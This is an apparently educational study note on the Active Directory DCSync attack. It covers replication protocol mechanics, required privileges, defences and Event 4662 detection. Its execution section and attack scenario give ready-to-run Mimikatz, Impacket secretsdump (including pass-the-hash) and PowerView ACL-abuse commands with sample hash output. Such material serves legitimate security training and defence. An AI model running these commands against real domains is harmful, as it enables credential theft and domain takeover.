---
tags: [active-directory, dcsync, mimikatz, replication, drsuapi]
difficulty: advanced
module: "36 - Active Directory Attacks"
topic: "36.15 DCSync Attack"
---
# 36.15 DCSync Attack

## 1. Introduction & Theory
The DCSync attack is a technique that allows an attacker to simulate the behavior of a Domain Controller (DC) in order to retrieve password hashes and other sensitive Active Directory data directly from another DC. Discovered and implemented in Mimikatz by Benjamin Delpy and Vincent Le Toux, DCSync eliminates the need to physically log onto a Domain Controller, drop a payload, or parse the `NTDS.DIT` database file locally.

Active Directory relies on multiple Domain Controllers to provide redundancy and load balancing. To ensure all DCs have the same information, they continuously synchronize the AD database (`NTDS.DIT`) among themselves using the **Directory Replication Service (DRS) Remote Protocol (MS-DRSR)**.

A DCSync attack occurs when a compromised account with sufficient privileges initiates a replication request to a legitimate DC. The attacker effectively says, "I am a Domain Controller, please replicate the password hashes for these users to me." The legitimate DC, seeing that the request comes from an authorized account, complies and sends the requested data—including NTLM hashes, Kerberos keys (AES), and LM hashes.

Because this attack leverages legitimate, built-in network protocols designed for core AD functionality, it is incredibly stealthy and difficult to block purely at the network level without disrupting actual replication.

## 2. ASCII Diagram of Attack Flow

```text
    [ Attacker Workstation ]                                      [ Legitimate Domain Controller ]
   (Compromised DA Account)                                              (DC01.domain.local)
              |                                                                |
              | 1. Bind to DRSUAPI RPC Endpoint                                |
              |--------------------------------------------------------------->|
              |    (Over MSRPC / SMB / TCP 135 & High Ports)                   |
              |                                                                |
              | 2. DRSBind() Request                                           |
              |    (Authenticates and establishes replication context)         |
              |--------------------------------------------------------------->|
              |                                                                |
              | 3. DRSBind() Response                                          |
              |<---------------------------------------------------------------|
              |                                                                |
              | 4. IDL_DRSGetNCChanges() Request                               |
              |    ("Please replicate the secrets for user 'krbtgt'")          |
              |--------------------------------------------------------------->|
              |                                                                |
              | 5. Verifies ACLs (Replicating Directory Changes)               |
              |    (Authorization successful)                                  |
              |                                                                |
              | 6. IDL_DRSGetNCChanges() Response                              |
              |    (Returns encrypted attributes: NTLM hash, AES keys, etc.)   |
              |<---------------------------------------------------------------|
              |                                                                |
              | 7. Attacker decrypts and displays hashes                       |
```

## 3. Attack Mechanics
The MS-DRSR protocol relies on RPC (Remote Procedure Call). When DCSync is executed, the tool (like Mimikatz or Impacket) performs the following sequence:
1. **RPC Binding:** It binds to the UUID `E3514235-4B06-11D1-AB04-00C04FC2DCD2`, which represents the DRSUAPI interface.
2. **DRSBind:** A function call to `DRSBind()` is made to establish a session with the directory service.
3. **DRSGetNCChanges:** The core of the attack is the `IDL_DRSGetNCChanges()` function. This function requests replication updates for a specific Naming Context (NC) or a specific object. The attacker specifically requests the password attributes (like `unicodePwd`, `ntPwdHistory`, `lmPwdHistory`, `supplementalCredentials`).
4. **Decryption:** The DC sends back the data encrypted with a session key (which is derived during the RPC bind process). The attacker's tool uses this session key to decrypt the attributes and retrieve the raw NTLM hashes and Kerberos keys.

### Required Privileges
Not just any user can perform DCSync. The executing account must have specific Extended Rights at the domain root level:
- `DS-Replication-Get-Changes` (Replicating Directory Changes): `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`
- `DS-Replication-Get-Changes-All` (Replicating Directory Changes All): `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`
- (Optionally) `DS-Replication-Get-Changes-In-Filtered-Set` (Replicating Directory Changes In Filtered Set): `89e95b76-ce4a-45c9-b449-c66d120a42f5`

By default, only the **Domain Admins**, **Enterprise Admins**, **Administrators**, and **Domain Controllers** groups have these permissions.

## 4. Execution

### Scenario A: DCSync with Mimikatz (Windows)
If you have code execution on a Windows machine under the context of a highly privileged account, you can use Mimikatz to DCSync.

To extract a specific user's hash (e.g., the `krbtgt` account, used to create Golden Tickets):
```text
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
```
**Sample Output:**
```text
[DC] 'domain.local' will be the domain
[DC] 'DC01.domain.local' will be the DC server
[DC] 'krbtgt' will be the user account

Object RDN           : krbtgt
...
Credentials:
  Hash NTLM: 550a2abf9... (32 hex chars)
  ...
  Supplemental Credentials:
  * AES256_CTS_HMAC_SHA1_96: a3...
  * AES128_CTS_HMAC_SHA1_96: 41...
```
To dump all hashes in the domain (use with caution in large environments):
```text
mimikatz # lsadump::dcsync /domain:domain.local /all /csv
```

### Scenario B: DCSync with Impacket (Linux/Remote)
If you have the credentials of a Domain Admin, you can perform DCSync remotely from an attacker machine using Impacket's `secretsdump.py`.

Extracting the `krbtgt` hash:
```bash
impacket-secretsdump 'domain.local/Administrator:Password123'@192.168.1.10 -just-dc-user krbtgt
```
Dumping the entire NTDS database:
```bash
impacket-secretsdump 'domain.local/Administrator:Password123'@192.168.1.10 -just-dc
```
**Sample Output:**
```text
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Dumping Domain Credentials (domain.local)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f9c3140a345...:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

### Scenario C: DCSync via Pass-the-Hash
If you have the NTLM hash of a DA but no plaintext password, you can still DCSync using Pass-the-Hash:
```bash
impacket-secretsdump -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'domain.local/Administrator'@192.168.1.10 -just-dc
```

## 5. Defense & Hardening

Because DCSync uses legitimate API calls, there is no patch for it. Defense entirely revolves around **Identity and Access Management (IAM)** and securing Active Directory ACLs.

- **Protect Highly Privileged Groups:** Strictly control membership of the Domain Admins, Enterprise Admins, and built-in Administrators groups. Use Tiering models (like ESAE/Tier 0) to ensure high-privileged credentials are never exposed on lower-tier workstations where they can be compromised.
- **Audit ACLs:** Ensure no standard users or non-DC service accounts have been granted the `Replicating Directory Changes` and `Replicating Directory Changes All` permissions. Attackers often grant these permissions to standard users to create stealthy backdoors (a persistence technique). Use tools like BloodHound or `ActiveDirectory` PowerShell module to audit this.
- **Principle of Least Privilege:** Services that integrate with AD (like Azure AD Connect or third-party identity management tools) technically require DCSync rights. Ensure these accounts are heavily monitored, use long complex passwords, and are restricted from logging into interactive sessions.

## 6. Detection Strategies

### Network Level (IDS/NDR)
Because normal replication only occurs between Domain Controllers, any `DRSBind` or `IDL_DRSGetNCChanges` RPC calls originating from a non-DC IP address are highly anomalous and indicative of a DCSync attack. Network Detection and Response (NDR) tools like Zeek can parse DCE/RPC traffic and generate alerts.

### Host Level (Event Logs)
DCSync can be detected via **Windows Event ID 4662** (An operation was performed on an object).
To enable this detection:
1. Ensure the `Audit Directory Service Access` policy is enabled.
2. Enable SACLs (System Access Control Lists) on the domain root object to audit successful read access to the specific extended rights GUIDs (`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` and `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`).

When a DCSync occurs, an Event ID 4662 will be generated showing the user account that requested access and the specific GUID of the requested property. If the user account is not a known DC computer account (e.g., `DC01$`), it is likely a DCSync attack.

## Real-World Attack Scenario

In an assumed-breach scenario, an attacker gained initial access to a workstation and successfully compromised the credentials of a Helpdesk administrator (`jsmith`) who was a member of the `Account Operators` group.

**The Context**
The attacker's ultimate goal was Domain Admin. However, the environment was heavily monitored for lateral movement via SMB and explicit modifications to the Domain Admins group. The attacker decided to bypass these alerts by performing a DCSync attack, directly extracting the `krbtgt` hash to forge a Golden Ticket.

**The Execution**
1.  **Privilege Validation:** The attacker checked the rights of the compromised `jsmith` account using BloodHound data and confirmed that `jsmith` did not have the `Replicating Directory Changes` rights required for DCSync.
2.  **ACL Abuse to DCSync:** The attacker noticed that `Account Operators` had `WriteDacl` permissions over the domain root object. The attacker used PowerView to grant the necessary DCSync rights to `jsmith`.
    `Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity "jsmith" -Rights DCSync`
3.  **The DCSync:** With the rights granted, the attacker used a remote implementation of DCSync via Impacket's `secretsdump.py`, targeting the primary Domain Controller from their attack machine.
    `impacket-secretsdump 'corp.local/jsmith:Password123!'@10.0.0.10 -just-dc-user krbtgt`
4.  **The Outcome:** The Domain Controller, seeing a valid replication request from an account with the correct Extended Rights, replied with the encrypted secrets. `secretsdump.py` decrypted the response and printed the NTLM hash and AES keys for the `krbtgt` account, allowing the attacker to establish undetectable, long-term persistence in the domain.

## 7. Chaining Opportunities
- **[[17 - ACL Abuse]]:** If an attacker finds an account that has `WriteDacl` over the domain root, they can grant themselves the DCSync rights and execute the attack without ever needing to become a Domain Admin.
- **Golden Ticket Attack:** The primary goal of DCSyncing the `krbtgt` account is to forge Golden Tickets for long-term, undetectable persistence and domain-wide access.
- **[[16 - DCShadow Attack]]:** DCShadow is the counterpart to DCSync. While DCSync *pulls* data, DCShadow *pushes* malicious data.

## 8. Related Notes
- [[06 - Kerberos Protocol Mechanisms]]
- [[20 - Golden and Silver Tickets]]
- [[23 - Active Directory Persistence]]
